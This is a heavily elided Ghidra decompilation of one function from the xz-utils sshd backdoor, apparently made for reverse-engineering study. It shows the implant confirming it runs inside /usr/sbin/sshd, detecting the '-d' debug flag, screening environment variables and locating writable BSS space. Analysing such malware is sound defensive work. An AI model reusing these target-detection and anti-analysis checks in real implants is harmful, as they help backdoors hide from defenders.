// /home/kali/xzre-ghidra/xzregh/103A20_sshd_validate_stack_argv_envp_layout.c
// Function: sshd_validate_stack_argv_envp_layout @ 0x103A20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_validate_stack_argv_envp_layout(elf_info_t * elf, u8 * stack_end)
...
BOOL sshd_validate_stack_argv_envp_layout(elf_info_t *elf,u8 *stack_end)

{
  ...
  if (((((&stack0xfffffffffffffff8 < stack_end) &&
    ...
    string_id = encoded_string_id_lookup((char *)argv_entry,(char *)0x0);
    arg_index = 1;
    if (string_id == STR_usr_sbin_sshd) {
      ...
      while (more_args_to_scan = arg_index != argc, arg_index = arg_index + 1, more_args_to_scan) {
        ...
        debug_match = argv_dash_option_contains_lowercase_d((char)*(u16 *)argv_entry,(char *)argv_entry);
      ...
      if (*(long *)(stack_end + arg_index * 8) == 0) {
        ...
        do {
          ...
          if ((argv_entry <= stack_end) || (0x4000 < (ulong)((long)argv_entry - (long)stack_end))) {
            ...
            bss_padding_base = (u8 *)elf_get_writable_tail_span(elf,bss_padding_bytes,TRUE);
          ...
          string_id = encoded_string_id_lookup((char *)*env_cursor,(char *)0x0);
          if (string_id != 0) {
            return FALSE;
          }
